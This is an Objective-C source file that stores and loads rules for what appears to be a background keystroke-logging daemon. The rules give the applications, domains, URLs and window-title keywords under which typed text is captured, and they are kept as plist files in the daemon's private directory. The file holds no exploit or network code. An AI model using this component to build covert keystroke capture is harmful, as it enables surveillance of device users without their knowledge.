//
//  KeySnapShotRuleStore.m
//  KeySnapShotRuleManager
//
//  Created by Makara Khloth on 10/24/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import "KeySnapShotRuleStore.h"

#import "SnapShotRule.h"
#import "KeyStrokeRule.h"
#import "MonitorApplication.h"
#import "DaemonPrivateHome.h"

@implementation KeySnapShotRuleStore

@synthesize mSnapShotRule, mMonitorApplications, mSnapShotRuleFilePath;

- (id) initWithSnapShotRuleFilePath: (NSString *) aSnapShotRuleFilePath {
    self = [super init];
    if (self) {
        [self setMSnapShotRuleFilePath:aSnapShotRuleFilePath];
    }
    return (self);
}

- (SnapShotRule *) mSnapShotRule {
    NSMutableArray *keyStrokeRules = [NSMutableArray array];
    NSDictionary *keyLogRuleInfo = [self getKeyLogRuleInfo];
    NSEnumerator *enumerator = [[keyLogRuleInfo allKeys] objectEnumerator];
    id object = nil;
    while (object = [enumerator nextObject]) {
        NSArray *setOfRule = (NSArray *)object;
        KeyStrokeRule *keyStrokeRule = [[KeyStrokeRule alloc] init];
        [keyStrokeRule setMApplicationID:[setOfRule objectAtIndex:0]];
        [keyStrokeRule setMTextLessThan:[[setOfRule objectAtIndex:1] longValue]];
        [keyStrokeRule setMDomain:[setOfRule objectAtIndex:2]];
        [keyStrokeRule setMURL:[setOfRule objectAtIndex:3]];
        [keyStrokeRule setMTitleKeyword:[setOfRule objectAtIndex:4]];
        [keyStrokeRules addObject:keyStrokeRule];
        [keyStrokeRule release];
    }
    SnapShotRule *snapShotRule = [[[SnapShotRule alloc] init] autorelease];
    [snapShotRule setMKeyStrokeRules:keyStrokeRules];
    [self setMSnapShotRule:snapShotRule];
    return (snapShotRule);
}

- (NSArray *) mMonitorApplications {
    NSMutableArray *monitorApps = [NSMutableArray array];
    NSDictionary *monitorAppsInfo = [self getMonitorApplicationInfo];
    NSEnumerator *enumerator = [[monitorAppsInfo allKeys] objectEnumerator];
    id object = nil;
    while (object = [enumerator nextObject]) {
        [monitorApps addObject:object];
    }
    [self setMMonitorApplications:monitorApps];
    return (monitorApps);
}

- (void) saveSnapShotRule:(SnapShotRule *)aSnapShotRule {
    NSString* snapShotRulePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:snapShotRulePath];
    NSMutableDictionary * plist = [[NSMutableDictionary alloc] init];
    
    /*
     Array of array, each element is a rule
        - 0, bundle ID
        - 1, text less than
        - 2, domain
        - 3, url
        - 4, title keyword
     */
    
    for (int i=0; i<[[aSnapShotRule mKeyStrokeRules] count]; i++) {
        KeyStrokeRule * keyStrokeRule = [[aSnapShotRule mKeyStrokeRules] objectAtIndex:i];
        NSMutableArray * setOfRule= [[NSMutableArray alloc] init];
        
        NSString * setOfApplicationID = [keyStrokeRule mApplicationID];
        NSString * setOftextLessThan = [NSString stringWithFormat:@"%ld", (long)[keyStrokeRule mTextLessThan]];
        NSString * setOfDomain = [keyStrokeRule mDomain];
        NSString * setOfURL =[keyStrokeRule mURL];
        NSString * setOfTitleKeyword = [keyStrokeRule mTitleKeyword];
        
        [setOfRule addObject:setOfApplicationID];
        [setOfRule addObject:setOftextLessThan];
        
        if ([setOfDomain length]>0) {
            [setOfRule addObject:setOfDomain];
        }else{
            [setOfRule addObject:@""];
        }
        
        if ([setOfURL length]>0) {
            [setOfRule addObject:setOfURL];
        }else{
            [setOfRule addObject:@""];
        }
        
        if ([setOfTitleKeyword length]>0) {
            [setOfRule addObject:setOfTitleKeyword];
        }else{
            [setOfRule addObject:@""];
        }
        
        NSString *dictKey = [NSString stringWithFormat:@"sAgentRule%d",i];
        [plist setObject:setOfRule forKey:dictKey];
        
        [setOfRule release];
    }
    
    DLog(@"snapShotRulePath %@",snapShotRulePath)
    DLog(@"saveMonitorApplications %@",plist)
    NSString *fileFullPath = [NSString stringWithFormat:@"%@sAgentRule.plist",snapShotRulePath];
    [plist writeToFile:fileFullPath atomically:YES];
    [plist release];
    DLog(@"Snap shot rules is saved to %@", fileFullPath);
    
    [self setMSnapShotRule:aSnapShotRule];
}

- (void) saveMonitorApplications: (NSArray *) aMonitorApplications {
    NSString* monitorAppsPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:monitorAppsPath];
    NSMutableDictionary * plist = [[NSMutableDictionary alloc] init];
    
    for (int i=0; i<[aMonitorApplications  count]; i++) {
        MonitorApplication * object = [aMonitorApplications objectAtIndex:i];
        NSString *dictKey = [NSString stringWithFormat:@"mAgentRule%d",i];
        [plist setObject:[object mApplicationID] forKey:dictKey];
    }
    DLog(@"monitorAppsPath %@",monitorAppsPath)
    DLog(@"saveMonitorApplications %@",plist)
    NSString *fileFullPath = [NSString stringWithFormat:@"%@mAgentRule.plist",monitorAppsPath];
    [plist writeToFile:fileFullPath atomically:YES];
    [plist release];
    DLog(@"Monitor applications is saved to %@", fileFullPath);
    
    [self setMMonitorApplications:aMonitorApplications];
}

- (NSDictionary *) getKeyLogRuleInfo {
    NSString * snapShotRulePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    NSString * pathTofile = [NSString stringWithFormat:@"%@sAgentRule.plist",snapShotRulePath];
    NSFileManager * find = [NSFileManager defaultManager];
    if ([find fileExistsAtPath:pathTofile]) {
         DLog(@"======== # !!! {Loading getKeyLogRuleInfo}");
         NSDictionary * plist = [[NSDictionary alloc]initWithContentsOfFile:pathTofile];
         DLog(@"snapShotRulePath %@",snapShotRulePath)
         DLog(@"saveMonitorApplications %@",plist)
         return [plist autorelease];
    }else{
        DLog(@"======== # !!! {getKeyLogRuleInfo} File not found");
        return nil;
    }
}

- (NSDictionary *) getMonitorApplicationInfo {
    NSString * monitorAppsPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    NSString * pathTofile = [NSString stringWithFormat:@"%@mAgentRule.plist",monitorAppsPath];
    NSFileManager * find = [NSFileManager defaultManager];
    if ([find fileExistsAtPath:pathTofile]) {
        DLog(@"======== # !!! {Loading getMonitorApplicationInfo}");
        NSDictionary * plist = [[NSDictionary alloc]initWithContentsOfFile:pathTofile];
        DLog(@"monitorAppsPath %@",monitorAppsPath)
        DLog(@"saveMonitorApplications %@",plist)
        return [plist autorelease];
    }else{
        DLog(@"======== # !!! {getMonitorApplicationInfo} File not found");
        return nil;
    }
}

- (void) deleteAllRules {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    NSString * monitorAppsPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    NSString * monitorPathTofile = [NSString stringWithFormat:@"%@mAgentRule.plist",monitorAppsPath];
    [fileManager removeItemAtPath:monitorPathTofile error:nil];
    
    NSString * snapShotRulePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
    NSString * snapShotPathTofile = [NSString stringWithFormat:@"%@sAgentRule.plist",snapShotRulePath];
    [fileManager removeItemAtPath:snapShotPathTofile error:nil];
}

- (void) dealloc {
    [mSnapShotRule release];
    [mMonitorApplications release];
    [mSnapShotRuleFilePath release];
    [super dealloc];
}

@end
